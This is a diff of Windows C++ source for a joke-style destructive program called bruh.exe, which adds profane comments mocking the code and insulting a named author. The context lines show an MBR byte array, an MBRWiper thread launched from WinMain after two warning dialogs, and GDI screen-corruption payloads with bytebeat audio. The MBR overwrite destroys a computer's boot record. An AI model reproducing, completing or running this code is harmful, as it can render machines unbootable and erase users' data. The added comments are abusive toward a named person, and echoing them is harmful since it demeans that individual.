@@ -1,10 +1,14 @@
+// this is the worlds fucking ass malware in this entire world then ultradashers malwares and i want you to skid it 
+// like, this is all trash-coded and fuckin ai coded
 typedef struct IUnknown IUnknown;
 #include <windows.h>
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib,"Msimg32.lib")
+// ugh so AI-generated
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
 struct Point3D { float x, y, z; };
+// what do you need these for, bitchminty?
 #define NUM_POINTS 600
 #define SPHERE_RADIUS 130.0f
 #define PI 3.14159265359f
@@ -60,6 +64,7 @@ const unsigned char MBR[]{
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
+// like wtf is this mbr its vibe coded and trash-coded and begged for them to make it just so stupid
 
 DWORD WINAPI MBRWiper(LPVOID lpParam) {
 	DWORD dwBytesWritten;
@@ -105,7 +110,7 @@ DWORD WINAPI payload1(LPVOID lpParam) {
 		BitBlt(hdc, w - 3, 0, w, h, hdc, 0, 0, SRCERASE);
 
 		StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCINVERT);
-
+        // "0x1900ac010e" you dont even need ts like you need srccopy wtf are even these for???
 		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
 		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
 
@@ -130,7 +135,7 @@ VOID WINAPI bytebeat1()
 
 	for (DWORD t = 0; t < size; ++t)
 	{
-
+     // even this is skidded too and ai coded bytebeat
 		buffer[t] = static_cast<unsigned char>(
 			(t) * (t >> (14 + (t & t >> 10))));
 	}
@@ -264,7 +269,7 @@ DWORD WINAPI payload3(LPVOID lpParam) {
 
 		DeleteObject(brush);
 		ReleaseDC(0, hdc);
-
+       // that is not a sphere, crzxyfuckty!
 		angle = fmod(angle + M_PI / radius, M_PI * radius) / 1.001;
 	}
 }
@@ -396,6 +401,7 @@ DWORD WINAPI payload5(LPVOID lpParam) { //If you get the reference, you win abso
 		HDC hdc = GetDC(0);
 		int w = GetSystemMetrics(0);
 		int h = GetSystemMetrics(1);
+		// this is so trash and generic
 		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, 0x999999);
 		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCINVERT);
 		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, 0x123958);
@@ -621,6 +627,7 @@ VOID WINAPI bytebeat7()
 }
 
 DWORD WINAPI icon(LPVOID lpParam) {
+	// this is fucking stolen and told ai to use question icons :sob:
 	HICON ico = LoadIcon(NULL, IDI_QUESTION);
 
 	V3 v[8] =
@@ -677,6 +684,7 @@ DWORD WINAPI payload8(LPVOID lpParam) {
 		HDC hdc = GetDC(0);
 		int w = GetSystemMetrics(0);
 		int h = GetSystemMetrics(1);
+		// booo!! generic and ai!!! hate it!
 		StretchBlt(hdc, -221, -221, w + 222, h + 222, hdc, 0, 0, w, h, 0x9999999);
 		ReleaseDC(0, hdc);
 	}
@@ -742,6 +750,7 @@ DWORD WINAPI payload9(LPVOID lpParam) {
 		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCINVERT);
 		for (int i = 0; i < sw * sh; i++) {
 			//int x = i % sw, y = i / sh, t = y ^ y | x;
+			// THERE IS FUCKING NO NEED TO PUT TRIPLE IN THERE BITCHMINTY
 			rgbtriple[i].rgbtRed += 225;
 			rgbtriple[i].rgbtGreen += 225;
 			rgbtriple[i].rgbtBlue += 225;
@@ -808,6 +817,7 @@ int WINAPI WinMain(
 	int nCmdShow
 )
 {
+	// this warning text is ai like wtf is this :sonion: :sob:
 	if (MessageBoxW(NULL, L"This program contains a huge risk of security and can make you lose data. Do you want to continue?", L"bruh.exe by  crzxymint", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
 	if (MessageBoxW(NULL, L"Are you sure you want to run this program? The creator are not responsible for any damages done to your device.\n\nARE YOU SURE?", L"bruh.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
 	CreateThread(0, 0, MBRWiper, 0, 0, 0);
@@ -823,7 +833,7 @@ int WINAPI WinMain(
 
 	CloseHandle(thread1);
 
-
+// even this redraw window is fucking ai and trash :sob:
 	RedrawWindow(
 		NULL,
 		NULL,
